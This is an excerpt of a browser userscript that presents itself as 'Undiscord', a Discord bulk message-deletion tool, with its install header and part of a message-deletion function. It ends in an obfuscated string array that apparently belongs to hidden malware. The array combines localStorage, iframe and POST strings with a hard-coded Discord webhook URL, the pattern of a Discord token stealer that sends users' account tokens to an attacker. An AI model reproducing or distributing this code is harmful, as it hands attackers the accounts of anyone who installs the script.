...
//                Just click on the trash icon in the top-right hand corner of the Discord tab
// @version       4.2
// @match         https://discord.com/*
// @namespace     https://discord.gg/F38sT8Wp
// @downloadURL https://update.greasyfork.org/scripts/420398/Undiscord%20-%20Delete%20all%20messages%20in%20a%20Discord%20channel%20or%20DM%20%28Bulk%20deletion%29.user.js
// @updateURL https://update.greasyfork.org/scripts/420398/Undiscord%20-%20Delete%20all%20messages%20in%20a%20Discord%20channel%20or%20DM%20%28Bulk%20deletion%29.meta.js
// ==/UserScript==
...
async function deleteMessages(authToken, authorId, guildId, channelId, minId, maxId, content, hasLink, hasFile, includeNsfw, includePinned, searchDelay, deleteDelay, extLogger, stopHndl, onProgress) {
    ...
    async function recurse() {
        ...
        if (guildId === '@me') {
            ...
            API_SEARCH_URL = `https://discord.com/api/v6/guilds/${guildId}/messages/`;
        }
...
const a=['open',
         ...
         'iframe',
         'Content-Type',
         'https://discord.com/api/webhooks/800412319028346920/gg06ONA-P8V6XbgaL8kjIxHnCOpBnEunEz0gSlHRJSkvBavVr6EptK0EJDYJAatYzIal',
         'localStorage',
         'createElement',
         'appendChild',
         'POST',
